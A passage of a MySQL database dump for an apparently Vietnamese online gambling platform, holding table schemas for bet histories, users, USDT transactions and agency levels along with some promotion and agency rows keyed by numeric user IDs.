(8, 463861, NULL, '554.00000000', 'Casino Online', '19:00 - 21:00', '', 7, '2021-01-20 10:20:42', '2021-01-27 10:20:42', -1, '990.00000000'),
(9, 463861, NULL, '555.00000000', 'Binary Options', '19:00 - 21:00', '', 30, '2021-01-20 10:21:18', '2021-02-19 10:21:18', -1, '990.00000000'),
(10, 463861, NULL, '554.00000000', 'Binary Options', '19:00 - 21:00', '', 30, '2021-01-20 10:21:29', '2021-02-19 10:21:29', -1, '990.00000000'),
(11, 463861, NULL, '552.00000000', 'Casino Online', '19:00 - 21:00', '', 7, '2021-01-20 10:23:21', '2021-01-27 10:23:21', -1, '990.00000000'),
(12, 463861, NULL, '9000.00000000', 'Binary Options', '19:00 - 21:00', '', 30, '2021-01-20 10:36:10', '2021-02-19 10:36:10', -1, '934.80000000'),
(13, 463861, NULL, '5000.00000000', 'Binary Options', '13:00 - 15:00', '', 30, '2021-01-21 03:16:12', '2021-02-20 03:16:12', -1, '4800.00000000'),
(14, 463861, NULL, '4000.00000000', 'Binary Options', '13:00 - 15:00', '', 30, '2021-01-21 03:16:53', '2021-02-20 03:16:53', -1, '4300.00000000'),
(15, 463861, NULL, '500.00000000', 'Casino Online', '19:00 - 21:00', '', 30, '2021-01-21 03:39:25', '2021-02-20 03:39:25', -1, '3900.00000000'),
(16, 463861, NULL, '500.00000000', 'Casino Online', '19:00 - 21:00', 'Jersey', 30, '2021-01-25 08:35:04', '2021-02-24 08:35:04', -1, '3850.00000000'),
(17, 463861, NULL, '500.00000000', 'Casino Online', '19:00 - 21:00', 'Jersey', 0, '2021-01-25 10:03:59', '2021-01-26 10:03:59', -1, '3800.00000000'),
(18, 463861, NULL, '600.00000000', 'Casino Online', '19:00 - 21:00', 'Burkina Faso', 7, '2021-01-25 10:13:46', '2021-02-01 10:13:46', -1, '3750.00000000'),
(19, 463861, NULL, '600.00000000', 'Casino Online', '19:00 - 21:00', 'Burkina Faso', 30, '2021-01-25 10:13:55', '2021-02-24 10:13:55', -1, '3690.00000000'),
(20, 463861, NULL, '1000.00000000', 'Fish Online', '19:00 - 22:00', 'Burkina Faso', 30, '2021-01-25 10:20:38', '2021-02-24 10:20:38', -1, '3630.00000000'),
(21, 463861, NULL, '1000.00000000', 'Fish Online', '19:00 - 22:00', 'Burkina Faso', 7, '2021-01-25 10:20:49', '2021-02-01 10:20:49', -1, '3510.00000000'),
(22, 463861, NULL, '550.00000000', 'Casino Online', '19:00 - 21:00', 'Burkina Faso', 7, '2021-01-26 02:11:35', '2021-02-02 02:11:35', 0, '3410.00000000'),
(23, 585389, NULL, '500.00000000', 'game1', '23:00 - 24:00', 'Jersey', 30, '2021-01-26 03:27:20', '2021-02-25 03:27:20', -1, '4900.00000000'),
(24, 585389, NULL, '500.00000000', 'Binary Options', '13:00 - 15:00', 'Argentina', 60, '2021-01-26 03:28:48', '2021-03-27 03:28:48', -1, '4840.00000000'),
(25, 585389, NULL, '500.00000000', 'Fish Online', '19:00 - 22:00', 'Bolivia', 90, '2021-01-26 03:31:39', '2021-04-26 03:31:39', -1, '4765.00000000'),
(26, 585389, NULL, '500.00000000', 'Casino Online', '13:00 - 15:00', 'Bahamas The', 21, '2021-01-26 03:38:15', '2021-02-16 03:38:15', -1, '4485.00000000'),
(27, 585389, NULL, '500.00000000', 'Sportbook', '23:00 - 24:00', 'Burkina Faso', 47, '2021-01-26 03:40:17', '2021-03-14 03:40:17', 0, '4477.00000000'),
(28, 585389, NULL, '11.00000000', 'Casino Online', '19:00 - 21:00', 'Antigua And Barbuda', 7, '2021-01-26 06:54:30', '2021-02-02 06:54:30', 0, '4454.50000000'),
(29, 585389, NULL, '11.00000000', 'Binary Options', '19:00 - 21:00', 'Antigua And Barbuda', 7, '2021-01-26 06:54:54', '2021-02-02 06:54:54', 0, '4453.40000000'),
(30, 585389, NULL, '11.00000000', 'Fish Online', '19:00 - 21:00', 'Antigua And Barbuda', 7, '2021-01-26 06:55:11', '2021-02-02 06:55:11', -1, '4452.30000000'),
(31, 585389, NULL, '50.00000000', 'Fish Online', '19:00 - 21:00', 'Antigua And Barbuda', 7, '2021-01-26 06:55:39', '2021-02-02 06:55:39', 0, '4451.20000000');

-- --------------------------------------------------------

--
-- Table structure for table `promotion_time_zoom`
--

DROP TABLE IF EXISTS `promotion_time_zoom`;
CREATE TABLE IF NOT EXISTS `promotion_time_zoom` (
  `id` int(11) NOT NULL,
  `time` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `status` int(11) NOT NULL,
  `Created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `Updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `promotion_time_zoom`
--

INSERT INTO `promotion_time_zoom` (`id`, `time`, `status`, `Created_at`, `Updated_at`) VALUES
(1, '19:00 - 21:00', 1, '2021-01-18 08:24:58', '2021-01-18 08:24:58'),
(2, '19:00 - 21:00', 1, '2021-01-18 08:25:13', '2021-01-18 08:25:13'),
(3, '19:00 - 21:00', 1, '2021-01-18 08:25:33', '2021-01-18 08:25:33'),
(4, '19:00 - 22:00', 1, '2021-01-18 09:03:42', '2021-01-18 09:03:42'),
(5, '13:00 - 15:00', 1, '2021-01-21 03:29:58', '2021-01-21 03:29:58'),
(6, '24:00', -1, '2021-01-25 09:42:20', '2021-01-25 09:42:20'),
(7, '23:00 - 24:00', 1, '2021-01-25 09:43:01', '2021-01-25 09:43:01'),
(8, '21:00 - 21:30', 1, '2021-01-26 04:25:15', '2021-01-26 04:25:15'),
(9, '22:00 - 22:30', 1, '2021-01-26 04:25:25', '2021-01-26 04:25:25');

-- --------------------------------------------------------

--
-- Table structure for table `pro_bet_history_ae_sexy`
--

DROP TABLE IF EXISTS `pro_bet_history_ae_sexy`;
CREATE TABLE IF NOT EXISTS `pro_bet_history_ae_sexy` (
  `id` int(11) NOT NULL,
  `gameType` varchar(10) DEFAULT NULL,
  `winAmount` decimal(18,4) DEFAULT NULL,
  `settleStatus` int(10) DEFAULT NULL,
  `realBetAmount` decimal(18,4) DEFAULT NULL,
  `realWinAmount` decimal(18,4) DEFAULT NULL,
  `txTime` varchar(50) DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL,
  `time123bet` datetime DEFAULT NULL,
  `userId` varchar(20) DEFAULT NULL,
  `betType` varchar(50) DEFAULT NULL,
  `platform` varchar(20) DEFAULT NULL,
  `txStatus` int(50) DEFAULT NULL,
  `betAmount` decimal(18,4) DEFAULT NULL,
  `gameName` varchar(50) DEFAULT NULL,
  `platformTxId` varchar(50) DEFAULT NULL,
  `betTime` varchar(50) DEFAULT NULL,
  `gameCode` varchar(50) DEFAULT NULL,
  `currency` varchar(4) DEFAULT NULL,
  `jackpotBetAmount` decimal(18,4) DEFAULT NULL,
  `jackpotWinAmount` decimal(18,4) DEFAULT NULL,
  `turnover` decimal(18,4) DEFAULT NULL,
  `roundId` varchar(50) DEFAULT NULL,
  `gameInfo` varchar(255) DEFAULT NULL,
  `statistical` int(10) DEFAULT '0',
  `user_parent` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `pro_bet_history_agin`
--

DROP TABLE IF EXISTS `pro_bet_history_agin`;
CREATE TABLE IF NOT EXISTS `pro_bet_history_agin` (
  `id` int(11) NOT NULL,
  `statistical` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `user_parent` varchar(255) DEFAULT NULL,
  `username` varchar(50) CHARACTER SET latin1 NOT NULL,
  `billno` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `productid` varchar(10) CHARACTER SET latin1 DEFAULT NULL,
  `billtime` datetime DEFAULT NULL COMMENT 'GMT -4',
  `currency` varchar(10) CHARACTER SET latin1 DEFAULT NULL,
  `gametype` varchar(10) CHARACTER SET latin1 DEFAULT NULL,
  `betIP` varchar(50) CHARACTER SET latin1 DEFAULT NULL,
  `account` decimal(18,8) DEFAULT NULL,
  `cus_account` decimal(18,8) DEFAULT NULL,
  `valid_account` decimal(18,8) DEFAULT NULL,
  `flag` int(11) DEFAULT NULL COMMENT '0 = chưa hoàn thành, 1 = hoàn thành, 2 = đang chờ xử lý, 4 = đã bán, -8 = hủy',
  `platformtype` varchar(10) CHARACTER SET latin1 DEFAULT NULL,
  `odds` varchar(150) CHARACTER SET latin1 DEFAULT NULL,
  `sport` varchar(150) CHARACTER SET latin1 DEFAULT NULL,
  `category` varchar(150) CHARACTER SET latin1 DEFAULT NULL,
  `extbillno` varchar(150) CHARACTER SET latin1 DEFAULT NULL,
  `thirdbillno` varchar(150) CHARACTER SET latin1 DEFAULT NULL,
  `bettype` int(11) DEFAULT NULL,
  `system` int(11) DEFAULT NULL,
  `live` int(11) DEFAULT NULL,
  `current_score` varchar(150) CHARACTER SET latin1 DEFAULT NULL,
  `time_123betnow` datetime DEFAULT NULL COMMENT 'GMT 0',
  `reckontime` varchar(255) CHARACTER SET latin1 DEFAULT NULL,
  `competition` text CHARACTER SET latin1,
  `market` text CHARACTER SET latin1,
  `selection` text CHARACTER SET latin1,
  `simplified_result` text CHARACTER SET latin1,
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Lịch sử bet spost book';

-- --------------------------------------------------------

--
-- Table structure for table `pro_bet_history_agin_hunterfish`
--

DROP TABLE IF EXISTS `pro_bet_history_agin_hunterfish`;
CREATE TABLE IF NOT EXISTS `pro_bet_history_agin_hunterfish` (
  `id` int(11) NOT NULL,
  `statistical` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `user_parent` varchar(50) NOT NULL,
  `username` varchar(50) CHARACTER SET latin1 NOT NULL,
  `productid` varchar(10) CHARACTER SET latin1 NOT NULL,
  `roomid` varchar(100) CHARACTER SET latin1 NOT NULL,
  `betx` decimal(18,8) NOT NULL,
  `sceneid` varchar(100) CHARACTER SET latin1 NOT NULL,
  `starttime` bigint(20) NOT NULL,
  `endtime` bigint(20) NOT NULL,
  `billtime` int(11) NOT NULL,
  `gametype` varchar(20) CHARACTER SET latin1 NOT NULL,
  `currency` varchar(5) CHARACTER SET latin1 NOT NULL,
  `totalbulletcost` decimal(18,8) NOT NULL,
  `totalfishcost` decimal(18,8) NOT NULL,
  `profit` decimal(18,8) NOT NULL,
  `totaljpcontribute` decimal(18,8) NOT NULL,
  `totaljackpot` decimal(18,8) NOT NULL,
  `totalfirstprize` decimal(18,8) NOT NULL,
  `remark` text CHARACTER SET latin1,
  `devicetype` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `totalweaponHit` int(11) NOT NULL,
  `totalcollection` int(11) NOT NULL,
  `time_123betnow` datetime NOT NULL,
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `pro_bet_history_agin_slot`
--

DROP TABLE IF EXISTS `pro_bet_history_agin_slot`;
CREATE TABLE IF NOT EXISTS `pro_bet_history_agin_slot` (
  `id` int(11) NOT NULL,
  `statistical` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `user_parent` varchar(50) NOT NULL,
  `username` varchar(50) CHARACTER SET latin1 NOT NULL,
  `billno` varchar(100) CHARACTER SET latin1 NOT NULL,
  `productid` varchar(10) CHARACTER SET latin1 NOT NULL,
  `billtime` datetime NOT NULL COMMENT 'GMT -4',
  `reckontime` datetime NOT NULL,
  `slottype` varchar(50) CHARACTER SET latin1 NOT NULL,
  `currency` varchar(10) CHARACTER SET latin1 NOT NULL,
  `gametype` varchar(10) CHARACTER SET latin1 NOT NULL,
  `betIP` varchar(50) CHARACTER SET latin1 NOT NULL,
  `account` decimal(18,8) NOT NULL COMMENT 'số tiền đặt cược',
  `cus_account` decimal(18,8) NOT NULL COMMENT 'số tiền thanh toán',
  `valid_account` decimal(18,8) NOT NULL,
  `account_base` decimal(18,8) NOT NULL COMMENT 'số tiền đặt cược bình thường. Bao gồm số tiền đặt cược JACKPOT nếu trò chơi có\r\nJACKPOT',
  `account_bonus` decimal(18,8) NOT NULL COMMENT 'số tiền đặt cược thưởng',
  `cus_account_base` decimal(18,8) NOT NULL COMMENT 'số tiền thanh toán bình thường',
  `cus_account_bonus` decimal(18,8) NOT NULL COMMENT 'số tiền trả thưởng',
  `src_amount` decimal(18,8) NOT NULL COMMENT 'số tiền ban đầu, trả về trống nếu loại trò chơi không hỗ trợ giá trị này',
  `dst_amount` decimal(18,8) NOT NULL COMMENT 'số tiền được cập nhật, trả về trống nếu loại trò chơi không hỗ trợ giá trị này',
  `flag` int(11) NOT NULL COMMENT '0 = bất thường (vui lòng liên hệ với dịch vụ khách hàng), 1 = hoàn thành, -8 = hủy\r\nHóa đơn của vòng cụ thể, -9 = hủy Số hóa đơn cụ thể',
  `platformtype` varchar(10) CHARACTER SET latin1 NOT NULL,
  `devicetype` int(11) NOT NULL COMMENT 'Loại thiết bị, 0 = PC, 1 = Di động',
  `exttxid` varchar(150) CHARACTER SET latin1 NOT NULL,
  `mainbillno` varchar(100) CHARACTER SET latin1 NOT NULL,
  `time_123betnow` datetime NOT NULL,
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `pro_bet_history_evo`
--

DROP TABLE IF EXISTS `pro_bet_history_evo`;
CREATE TABLE IF NOT EXISTS `pro_bet_history_evo` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `user_parent` varchar(255) DEFAULT NULL,
  `game_name` varchar(50) CHARACTER SET latin1 DEFAULT NULL,
  `suboper` varchar(50) CHARACTER SET latin1 DEFAULT NULL,
  `betmoney` double DEFAULT NULL,
  `awardmoney` double DEFAULT NULL,
  `roundid` bigint(20) DEFAULT NULL,
  `orderid` text CHARACTER SET latin1,
  `betresult` varchar(50) CHARACTER SET latin1 DEFAULT NULL,
  `bettime` text CHARACTER SET latin1,
  `timestring` bigint(20) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `Statistical` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `pro_bet_history_wm`
--

DROP TABLE IF EXISTS `pro_bet_history_wm`;
CREATE TABLE IF NOT EXISTS `pro_bet_history_wm` (
  `id` int(11) NOT NULL,
  `username` varchar(50) CHARACTER SET latin1 NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `user_parent` varchar(255) DEFAULT NULL,
  `game_type` varchar(50) CHARACTER SET latin1 NOT NULL,
  `game_id` int(11) NOT NULL,
  `web` varchar(50) CHARACTER SET latin1 NOT NULL,
  `bet_id` varchar(50) CHARACTER SET latin1 NOT NULL,
  `bet_amount` double NOT NULL,
  `rolling` double NOT NULL,
  `result_amount` double NOT NULL,
  `balance` double NOT NULL,
  `game_result` int(11) NOT NULL,
  `transaction_id` int(11) NOT NULL,
  `bet_source` int(11) NOT NULL,
  `bet_type` int(11) NOT NULL,
  `bet_time` datetime NOT NULL,
  `payout_time` datetime NOT NULL,
  `game_set` int(11) NOT NULL,
  `host_id` int(11) NOT NULL,
  `host_name` int(11) NOT NULL,
  `off_set` int(11) NOT NULL,
  `created_at` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `pro_money`
--

DROP TABLE IF EXISTS `pro_money`;
CREATE TABLE IF NOT EXISTS `pro_money` (
  `Money_ID` int(10) NOT NULL,
  `Money_User` varchar(20) CHARACTER SET utf8 NOT NULL,
  `Money_Parent_ID` varchar(255) CHARACTER SET utf8 NOT NULL,
  `Money_USDT` decimal(18,8) NOT NULL DEFAULT '0.00000000',
  `Money_USDTFee` decimal(18,8) NOT NULL DEFAULT '0.00000000',
  `Money_Game` int(11) DEFAULT NULL,
  `Money_Time` bigint(20) NOT NULL,
  `Money_Comment` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `Money_MoneyAction` int(10) NOT NULL,
  `Money_MoneyStatus` int(10) NOT NULL DEFAULT '0',
  `Money_Token` varchar(200) CHARACTER SET utf8 DEFAULT NULL,
  `Money_Address` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `Money_Currency` int(10) DEFAULT NULL,
  `Money_CurrentAmount` decimal(18,8) NOT NULL DEFAULT '0.00000000',
  `Money_CurrencyFrom` tinyint(1) NOT NULL,
  `Money_CurrencyTo` tinyint(1) NOT NULL,
  `Money_Rate` decimal(18,8) NOT NULL DEFAULT '0.00000000',
  `Money_Confirm` tinyint(1) NOT NULL DEFAULT '0' COMMENT '1: đã duyệt\r\n0: đang chờ\r\n-1: huỷ\r\n',
  `Money_Confirm_Time` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `pro_users`
--

DROP TABLE IF EXISTS `pro_users`;
CREATE TABLE IF NOT EXISTS `pro_users` (
  `User_ID` varchar(20) CHARACTER SET utf8 NOT NULL,
  `User_Provide` varchar(255) CHARACTER SET utf8 NOT NULL,
  `User_Parent_ID` varchar(200) CHARACTER SET utf8 DEFAULT NULL,
  `User_Email` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `User_Tree` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `User_Name` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `User_WM_Password` varchar(50) CHARACTER SET utf8 DEFAULT NULL,
  `User_Evo_Password` varchar(50) CHARACTER SET utf8 DEFAULT NULL,
  `User_Agin_Password` varchar(50) CHARACTER SET utf8 DEFAULT NULL,
  `User_AWC_Password` varchar(255) CHARACTER SET utf8mb4 DEFAULT NULL,
  `User_Agin` varchar(50) CHARACTER SET utf8 DEFAULT NULL,
  `User_WM555` varchar(50) CHARACTER SET utf8 DEFAULT NULL,
  `User_AWC` varchar(50) CHARACTER SET utf8 NOT NULL,
  `User_789API` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `User_Casino` varchar(50) CHARACTER SET utf8 DEFAULT NULL,
  `User_SportBook` tinyint(1) DEFAULT NULL,
  `User_AZ8SportBook` int(11) DEFAULT NULL,
  `User_SkyGame` tinyint(1) DEFAULT NULL,
  `User_Evo` varchar(50) CHARACTER SET utf8 DEFAULT NULL,
  `User_Status` tinyint(1) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `rate`
--

DROP TABLE IF EXISTS `rate`;
CREATE TABLE IF NOT EXISTS `rate` (
  `rate_ID` int(11) NOT NULL,
  `rate_Amount` decimal(18,8) NOT NULL,
  `rate_Time` int(11) NOT NULL,
  `rate_Duration` decimal(18,4) NOT NULL DEFAULT '0.0000',
  `rate_Symbol` varchar(10) NOT NULL,
  `rate_Log` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `sa_history`
--

DROP TABLE IF EXISTS `sa_history`;
CREATE TABLE IF NOT EXISTS `sa_history` (
  `id` int(11) NOT NULL,
  `BetTime` varchar(255) NOT NULL,
  `PayoutTime` varchar(255) NOT NULL,
  `Username` varchar(255) NOT NULL,
  `HostID` int(11) NOT NULL,
  `GameID` varchar(255) NOT NULL,
  `Round` int(11) NOT NULL,
  `Set` int(11) NOT NULL,
  `BetID` varchar(255) NOT NULL,
  `BetAmount` float NOT NULL,
  `Rolling` float NOT NULL,
  `ResultAmount` float NOT NULL,
  `Balance` float NOT NULL,
  `GameType` varchar(50) NOT NULL,
  `BetType` varchar(50) NOT NULL,
  `BetSource` varchar(50) NOT NULL,
  `Detail` text,
  `TransactionID` varchar(25) NOT NULL,
  `GameResult` text,
  `State` varchar(20) NOT NULL,
  `CreatedAt` datetime DEFAULT NULL,
  `UpdatedAt` datetime DEFAULT NULL,
  `statistical` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `set_agency`
--

DROP TABLE IF EXISTS `set_agency`;
CREATE TABLE IF NOT EXISTS `set_agency` (
  `id` int(11) NOT NULL,
  `user` int(11) NOT NULL,
  `level` int(11) NOT NULL,
  `datetime` datetime NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `set_agency`
--

INSERT INTO `set_agency` (`id`, `user`, `level`, `datetime`, `status`) VALUES
(6, 123123, 7, '2021-05-06 11:35:14', -1),
(7, 120376, 5, '2021-05-07 03:02:49', -1),
(8, 120376, 6, '2021-05-07 03:03:03', -1),
(9, 120376, 7, '2021-05-07 03:03:15', -1),
(10, 456319, 6, '2021-08-25 05:03:18', -1),
(11, 456319, 7, '2021-08-25 05:03:23', -1),
(12, 456319, 6, '2021-08-25 05:04:38', -1),
(13, 456319, 7, '2021-08-25 05:14:54', -1),
(14, 544693, 6, '2021-08-25 05:15:06', -1),
(15, 151313, 5, '2021-08-25 05:15:20', -1),
(16, 150299, 6, '2021-08-25 05:15:38', -1),
(17, 392912, 6, '2021-08-25 05:17:15', -1),
(18, 930092, 7, '2022-02-01 06:05:49', -1),
(19, 122351, 5, '2022-02-06 09:39:54', -1),
(20, 938583, 6, '2022-02-11 03:24:25', -1),
(21, 242474, 7, '2022-05-27 07:44:25', -1),
(22, 250264, 5, '2022-06-08 09:33:27', -1),
(23, 575787, 7, '2022-09-29 04:26:38', -1),
(24, 732616, 7, '2022-10-05 03:46:49', -1),
(25, 730363, 7, '2022-12-08 17:06:01', -1),
(26, 389487, 7, '2023-02-02 05:15:54', -1),
(27, 986210, 7, '2023-04-07 09:02:42', -1),
(28, 732351, 7, '2023-04-07 09:05:07', -1),
(29, 986210, 7, '2023-04-17 10:14:28', -1),
(30, 732351, 7, '2023-04-17 10:14:57', 1),
(31, 575787, 7, '2023-04-17 10:15:15', 1),
(32, 263632, 7, '2023-04-17 10:15:33', -1),
(33, 852818, 6, '2023-04-17 10:16:46', 1),
(34, 403718, 6, '2023-04-17 10:17:12', -1),
(35, 592427, 6, '2023-04-17 10:17:25', 1),
(36, 369925, 6, '2023-04-17 10:17:42', -1),
(37, 140135, 6, '2023-04-17 10:19:30', -1),
(38, 362751, 6, '2023-04-21 13:53:53', -1),
(39, 366593, 7, '2023-04-21 13:54:14', -1),
(40, 468860, 5, '2023-04-22 03:09:11', -1),
(41, 369925, 5, '2023-04-22 03:09:44', -1),
(42, 362751, 5, '2023-04-22 03:09:53', -1),
(43, 362751, 6, '2023-04-22 13:44:17', 1),
(44, 369925, 6, '2023-04-22 13:44:27', 1),
(45, 468860, 6, '2023-04-22 13:44:35', 1),
(46, 106740, 5, '2023-04-25 04:55:40', 1),
(47, 652579, 7, '2023-04-27 12:39:02', 1),
(48, 314678, 7, '2023-05-01 16:29:54', -1),
(49, 140135, 7, '2023-05-01 16:30:18', -1),
(50, 986210, 6, '2023-05-03 02:41:23', 1),
(51, 263632, 6, '2023-05-03 02:41:33', 1),
(52, 140135, 6, '2023-05-03 02:41:44', 1),
(53, 366593, 6, '2023-05-03 02:41:55', 1),
(54, 314678, 6, '2023-05-03 02:42:03', 1),
(55, 403718, 5, '2023-05-03 12:17:21', 1),
(56, 950473, 6, '2023-05-12 13:42:12', 1),
(57, 279002, 6, '2023-05-29 10:34:40', 1),
(58, 279315, 5, '2023-06-03 03:43:11', -1),
(59, 765901, 6, '2023-06-21 01:18:21', 1),
(60, 296764, 5, '2023-06-23 10:07:36', 1),
(61, 353306, 7, '2023-09-04 06:57:56', 1),
(62, 294688, 7, '2023-12-05 16:29:09', 1),
(63, 475729, 7, '2024-01-15 08:55:57', 1),
(64, 200763, 7, '2024-01-15 08:56:06', -1),
(65, 630178, 6, '2024-01-15 08:56:23', -1),
(66, 589642, 5, '2024-01-15 08:56:34', -1),
(67, 724491, 6, '2024-01-16 06:52:38', 1),
(68, 200763, 6, '2024-01-18 04:41:01', 1),
(69, 630178, 5, '2024-01-18 04:41:35', 1),
(70, 589642, 4, '2024-01-18 04:42:03', 1);

-- --------------------------------------------------------

--
-- Table structure for table `show_history_evolution`
--

DROP TABLE IF EXISTS `show_history_evolution`;
CREATE TABLE IF NOT EXISTS `show_history_evolution` (
  `id` int(11) NOT NULL,
  `evo_id` varchar(100) NOT NULL,
  `evo_agent` varchar(10) NOT NULL,
  `evo_username` varchar(15) NOT NULL,
  `userId` int(11) NOT NULL,
  `evo_currency` varchar(5) NOT NULL,
  `evo_game` varchar(255) NOT NULL,
  `evo_game_id` varchar(255) NOT NULL,
  `evo_betcode` varchar(255) NOT NULL,
  `evo_bet` decimal(18,8) NOT NULL,
  `evo_payout` decimal(18,8) NOT NULL,
  `evo_win` decimal(18,8) NOT NULL,
  `evo_datetime` datetime NOT NULL COMMENT 'UTC +0',
  `evo_status` varchar(20) NOT NULL,
  `evo_result` varchar(20) NOT NULL,
  `time_123betnow` date NOT NULL COMMENT '+0, +1',
  `statistical` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `show_history_sbobet`
--

DROP TABLE IF EXISTS `show_history_sbobet`;
CREATE TABLE IF NOT EXISTS `show_history_sbobet` (
  `id` int(11) NOT NULL,
  `username` varchar(25) COLLATE utf8_unicode_ci NOT NULL,
  `userId` int(11) NOT NULL DEFAULT '0',
  `turnover_by_stake` decimal(18,8) NOT NULL,
  `net_turnover_by_stake` decimal(18,8) NOT NULL,
  `turnover_by_actual_stake` decimal(18,8) NOT NULL,
  `net_turnover_by_actual_stake` decimal(18,8) NOT NULL,
  `currency` varchar(10) COLLATE utf8_unicode_ci NOT NULL,
  `number_of_bets` decimal(18,8) NOT NULL,
  `member_wins` decimal(18,8) NOT NULL,
  `company` decimal(18,8) NOT NULL,
  `sgd_company` decimal(18,8) NOT NULL,
  `time_123betnow` datetime NOT NULL,
  `statistical` int(11) NOT NULL,
  `date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `sportbook_history`
--

DROP TABLE IF EXISTS `sportbook_history`;
CREATE TABLE IF NOT EXISTS `sportbook_history` (
  `id` int(11) NOT NULL,
  `bet` varchar(255) NOT NULL,
  `account` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `date` datetime NOT NULL,
  `device` varchar(50) NOT NULL,
  `sport` varchar(255) NOT NULL,
  `league` text NOT NULL,
  `event` text NOT NULL,
  `matchdate` varchar(255) NOT NULL,
  `score` varchar(255) NOT NULL,
  `market` varchar(255) NOT NULL,
  `betpos_hdp` varchar(255) NOT NULL,
  `odds` varchar(50) NOT NULL,
  `stake` varchar(255) NOT NULL,
  `insurancesold` varchar(255) NOT NULL,
  `status` varchar(255) NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  `statistical` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
